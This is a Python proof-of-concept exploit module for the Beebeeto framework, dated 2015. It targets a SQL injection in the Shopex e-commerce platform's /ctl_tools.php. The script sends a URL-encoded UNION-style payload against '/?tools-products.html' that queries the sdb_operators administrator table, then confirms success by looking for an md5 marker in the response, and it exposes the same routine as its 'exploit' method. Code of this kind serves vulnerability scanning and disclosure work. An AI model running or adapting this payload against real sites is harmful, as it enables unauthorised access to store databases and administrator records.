#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0064',
            'name': 'Shopex /ctl_tools.php SQL注入漏洞 POC',
            'author': 'ca2fux1n',
            'create_date': '2015-03-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Shopex',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['Shopex漏洞', 'SQL INJECTION', 'php', '/ctl_tools.php'],
            'desc': 'N/A',
            'references': ['https://www.bugscan.net/#!/n/163',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/?tools-products.html'
        payload = ("goods%3D1%2C2%22%29%20rank%2C%28SELECT%20concat%280x23%2Cmd5%283.1415%29"
                   "%2C0x23%29%20FROM%20sdb_operators%20limit%200%2C1%29%20as%20goods_id%2C"
                   "image_default%2Cthumbnail_pic%2Cbrief%2Cpdt_desc%2Cmktprice%2Cbig_pic%20"
                   "FROM%20sdb_goods%20limit%200%2C1%20%23")
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Content: ' + payload
        content = requests.post(verify_url, data=payload).content
        if '63e1f04640e83605c1d177544a5a0488' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['post_content'] = payload
        return args


    exploit = verify


if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())